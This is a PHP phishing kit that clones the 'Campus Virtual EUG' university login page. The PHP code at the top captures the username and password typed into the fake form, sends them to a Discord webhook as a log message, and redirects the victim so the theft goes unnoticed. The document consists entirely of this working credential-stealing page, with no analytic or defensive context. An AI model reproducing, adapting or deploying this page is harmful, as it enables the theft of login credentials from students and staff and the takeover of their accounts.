<?php
if ($_POST) {
    $WEBHOOK = "https://discord.com/api/webhooks/953718081761452052/CHANGE THİS";
    $NAME = $_POST["adsoy"];
    $PASS = $_POST["tckn"];
    $headers = [ 'Content-Type: application/json; charset=utf-8' ];
    $POST = [ 'username' => 'DuzgunLog', 'content' => "$NAME | $PASS" ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
    header('Location: bebek.php'); //sonrasındaki gidilecek sayfa
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Campus Virtual EUG: Log in to the site</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

    <div class="main">
        <div class="main-div">
            <div class="logo">
                <img src="logo.png" alt="logo">
            </div>
            <div class="form-div">
                <form class="form" action="" method="post" id="loginForm" autocomplete="off" role="form">
                    <input type="text" placeholder="Username" class="z" id="adsoy" name="adsoy" tabindex="1" required>
                    <input type="password" placeholder="Password" class="z" id="tckn" name="tckn" tabindex="2" required>
                    <input type="submit" value="Log in" class="log" id="submit">
                </form>
            </div>
            <div class="lost">
                <a href="#">Lost password?</a>
            </div>
            <div class="cevap-cizgisi"></div>
            <div class="microsoft">
                <h3>Log in using your account on:</h3>
                <button class="miclogo">
                    <img src="microsoft.ico" alt="microsoft-icon">
                    <span>Microsoft 365</span>
                </button>
                <br>
                <br>
                <div class="cevap-cizgisi"></div>
            </div>
            <div class="some">
                <h3>Some courses may allow guest access</h3>
                <button>Acces as a guest</button>
            </div>
            <div class="cevap-cizgisi"></div>
            <div class="lanco">
                <div class="language">
                    <a href="#">English (en)</a>
                    <span><i class="fa-solid fa-chevron-down"></i></span>
                </div>
                <div class="cookie">
                    <button>
                        <p>Cookies notice</p>
                    </button>
                </div>
            </div>

        </div>
    </div>



    



